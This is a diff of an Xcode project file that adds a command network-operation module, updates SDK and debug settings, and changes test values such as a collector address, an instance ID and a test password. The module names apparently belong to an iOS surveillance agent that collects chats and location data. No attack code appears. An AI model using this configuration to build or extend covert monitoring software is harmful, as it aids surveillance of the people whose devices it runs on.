@@ -217,7 +217,10 @@
 		CC04D34B15E2209A00B12C6D /* RCSIGlobals.m in Sources */ = {isa = PBXBuildFile; fileRef = CC04D34A15E2209A00B12C6D /* RCSIGlobals.m */; };
 		CC1B55DF15C035A800EDD3F4 /* RCSIAgentChat.m in Sources */ = {isa = PBXBuildFile; fileRef = CC1B55DE15C035A800EDD3F4 /* RCSIAgentChat.m */; };
 		CC282097163FE59B00439547 /* RCSINullEvent.m in Sources */ = {isa = PBXBuildFile; fileRef = CC282096163FE59B00439547 /* RCSINullEvent.m */; };
+		CC31A88A1680B41600B6E0DD /* RCSINullEvent.m in Sources */ = {isa = PBXBuildFile; fileRef = CC282096163FE59B00439547 /* RCSINullEvent.m */; };
 		CC386BF715F1096400E644F6 /* RCSIGlobals.m in Sources */ = {isa = PBXBuildFile; fileRef = CC04D34A15E2209A00B12C6D /* RCSIGlobals.m */; };
+		CC436C7016D6100000D3FB5E /* CommandsNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = CC436C6F16D6100000D3FB5E /* CommandsNetworkOperation.m */; };
+		CC436C7216D62A9A00D3FB5E /* CommandsNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = CC436C6F16D6100000D3FB5E /* CommandsNetworkOperation.m */; };
 		CC54E4911600B6F90091E0D2 /* RCSIAgentChat.m in Sources */ = {isa = PBXBuildFile; fileRef = CC1B55DE15C035A800EDD3F4 /* RCSIAgentChat.m */; };
 		CCBEFEAC15B6B02C00951F6D /* RCSIAgentPositionSupport.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A19BEB4107C9A300060F679 /* RCSIAgentPositionSupport.m */; };
 /* End PBXBuildFile section */
@@ -486,6 +489,8 @@
 		CC1B55DE15C035A800EDD3F4 /* RCSIAgentChat.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = RCSIAgentChat.m; sourceTree = "<group>"; };
 		CC282095163FE59B00439547 /* RCSINullEvent.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSINullEvent.h; path = Modules/RCSINullEvent.h; sourceTree = "<group>"; };
 		CC282096163FE59B00439547 /* RCSINullEvent.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSINullEvent.m; path = Modules/RCSINullEvent.m; sourceTree = "<group>"; };
+		CC436C6E16D6100000D3FB5E /* CommandsNetworkOperation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = CommandsNetworkOperation.h; path = Modules/CommandsNetworkOperation.h; sourceTree = "<group>"; };
+		CC436C6F16D6100000D3FB5E /* CommandsNetworkOperation.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = CommandsNetworkOperation.m; path = Modules/CommandsNetworkOperation.m; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -896,6 +901,8 @@
 		52815C1613253085004E5138 /* Operations */ = {
 			isa = PBXGroup;
 			children = (
+				CC436C6E16D6100000D3FB5E /* CommandsNetworkOperation.h */,
+				CC436C6F16D6100000D3FB5E /* CommandsNetworkOperation.m */,
 				52815C59132531F5004E5138 /* AuthNetworkOperation.h */,
 				52815C5A132531F5004E5138 /* AuthNetworkOperation.m */,
 				52815C5B132531F5004E5138 /* ByeNetworkOperation.h */,
@@ -1275,6 +1282,7 @@
 				CC1B55DF15C035A800EDD3F4 /* RCSIAgentChat.m in Sources */,
 				CC04D34B15E2209A00B12C6D /* RCSIGlobals.m in Sources */,
 				CC282097163FE59B00439547 /* RCSINullEvent.m in Sources */,
+				CC436C7016D6100000D3FB5E /* CommandsNetworkOperation.m in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -1282,6 +1290,7 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				CC31A88A1680B41600B6E0DD /* RCSINullEvent.m in Sources */,
 				CC54E4911600B6F90091E0D2 /* RCSIAgentChat.m in Sources */,
 				CC386BF715F1096400E644F6 /* RCSIGlobals.m in Sources */,
 				5233A623156F7180008D80D0 /* RCSIDylibBlob.m in Sources */,
@@ -1327,6 +1336,7 @@
 				5217E0E7151E4C5D0011ED1E /* LogNetworkOperation.m in Sources */,
 				5217E0E8151E4C5D0011ED1E /* UpgradeNetworkOperation.m in Sources */,
 				5217E0E9151E4C5D0011ED1E /* UploadNetworkOperation.m in Sources */,
+				CC436C7216D62A9A00D3FB5E /* CommandsNetworkOperation.m in Sources */,
 				5217E0EA151E4C5D0011ED1E /* RESTTransport.m in Sources */,
 				5217E0EB151E4C5D0011ED1E /* Transport.m in Sources */,
 				5217E0EC151E4C5D0011ED1E /* RESTNetworkProtocol.m in Sources */,
@@ -1449,6 +1459,7 @@
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				COPY_PHASE_STRIP = NO;
 				DEAD_CODE_STRIPPING = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				FRAMEWORK_SEARCH_PATHS = (
 					"$(inherited)",
 					"\"$(SDKROOT)$(SYSTEM_LIBRARY_DIR)/PrivateFrameworks\"",
@@ -1474,10 +1485,10 @@
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				RCS_TEST_COLLECTOR = 192.168.100.100;
 				RCS_TEST_DEVICE_ADDRESS = 127.0.0.1;
-				RCS_TEST_INSTANCE = RCS_0000001196;
+				RCS_TEST_INSTANCE = RCS_0000001440;
 				RCS_TEST_PASSWD = ios_test;
 				RCS_TEST_SHLIB_DIR = /Users/armored/ios_debug;
-				RCS_TEST_SYNCH = YES;
+				RCS_TEST_SYNCH = NO;
 				RCS_TEST_USER = iostest;
 				SDKROOT = iphoneos3.0;
 				TARGETED_DEVICE_FAMILY = 1;
@@ -1493,6 +1504,7 @@
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				COPY_PHASE_STRIP = YES;
 				DEAD_CODE_STRIPPING = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				FRAMEWORK_SEARCH_PATHS = (
 					"$(inherited)",
 					"\"$(SDKROOT)$(SYSTEM_LIBRARY_DIR)/PrivateFrameworks\"",
@@ -1515,10 +1527,10 @@
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				RCS_TEST_COLLECTOR = 192.168.100.100;
 				RCS_TEST_DEVICE_ADDRESS = 127.0.0.1;
-				RCS_TEST_INSTANCE = RCS_0000001196;
+				RCS_TEST_INSTANCE = RCS_0000001440;
 				RCS_TEST_PASSWD = ios_test;
 				RCS_TEST_SHLIB_DIR = /Users/armored/ios_debug;
-				RCS_TEST_SYNCH = YES;
+				RCS_TEST_SYNCH = NO;
 				RCS_TEST_USER = iostest;
 				SDKROOT = iphoneos3.0;
 				TARGETED_DEVICE_FAMILY = 1;
@@ -1560,11 +1572,11 @@
 				OTHER_LDFLAGS = "-weak-lEventKit";
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				RCS_TEST_COLLECTOR = 192.168.100.100;
-				RCS_TEST_INSTANCE = RCS_0000001196;
+				RCS_TEST_INSTANCE = RCS_0000001440;
 				RCS_TEST_PASSWD = ios_test;
-				RCS_TEST_SYNCH = YES;
+				RCS_TEST_SYNCH = NO;
 				RCS_TEST_USER = iostest;
-				SDKROOT = iphoneos4.2;
+				SDKROOT = iphoneos6.0;
 				SUPPORTED_PLATFORMS = iphoneos;
 				TARGETED_DEVICE_FAMILY = "1,2";
 				USER_HEADER_SEARCH_PATHS = "./**";
@@ -1601,11 +1613,11 @@
 				OTHER_LDFLAGS = "-weak-lEventKit";
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				RCS_TEST_COLLECTOR = 192.168.100.100;
-				RCS_TEST_INSTANCE = RCS_0000001196;
+				RCS_TEST_INSTANCE = RCS_0000001440;
 				RCS_TEST_PASSWD = ios_test;
-				RCS_TEST_SYNCH = YES;
+				RCS_TEST_SYNCH = NO;
 				RCS_TEST_USER = iostest;
-				SDKROOT = iphoneos4.2;
+				SDKROOT = iphoneos6.0;
 				SUPPORTED_PLATFORMS = iphoneos;
 				TARGETED_DEVICE_FAMILY = "1,2";
 				USER_HEADER_SEARCH_PATHS = "./**";
@@ -1688,6 +1700,7 @@
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "";
 				COPY_PHASE_STRIP = NO;
 				DEAD_CODE_STRIPPING = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				GCC_C_LANGUAGE_STANDARD = gnu99;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_ENABLE_SYMBOL_SEPARATION = NO;
@@ -1732,6 +1745,7 @@
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "";
 				COPY_PHASE_STRIP = YES;
 				DEAD_CODE_STRIPPING = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				GCC_C_LANGUAGE_STANDARD = gnu99;
 				GCC_ENABLE_SYMBOL_SEPARATION = NO;
 				GCC_PRECOMPILE_PREFIX_HEADER = NO;
